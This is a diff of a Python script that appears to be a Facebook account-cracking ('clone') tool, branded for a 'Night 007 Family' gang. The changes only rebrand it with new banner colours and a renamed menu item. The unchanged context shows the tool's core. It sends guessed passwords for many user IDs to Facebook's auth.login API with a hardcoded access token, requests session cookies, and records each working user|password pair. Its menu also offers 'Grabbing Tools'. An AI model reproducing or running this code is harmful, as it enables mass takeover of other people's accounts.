@@ -74,7 +74,7 @@ banner = """
 \x1b[1;93m➣ Facebook: Faisal Rehman
 \x1b[1;98m➣ Gift     :  FOR MISHAL SHONI
 \x1b[1;91m➣ Ap Dil Ban k Drakhty Ho Mery Seny main❤
-\x1b[1;95m➣ Gang  :  Night 007 Family
+\x1b[1;99m➣ Gang  :  Night 007 Family
 
 -----------------------------------------------"""
 # titik #
@@ -129,7 +129,7 @@ def menu():
 	print "[2] Clone With Pass Choice."
 	print "[3] Grabbing Tools."
 	print "[4] Auto Del Tools."
-	print "[5] Update HOP Tool."
+	print "[5] Update Mishi Tool."
 	print "[6] Follow Me On Facebook."
 	print "[7] Logout"
 	print ('                  ')
@@ -270,7 +270,7 @@ def crack_menu():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if "access_token" in q:
-				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
+				print '\x1b[1;31m[\x1b[1;31mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
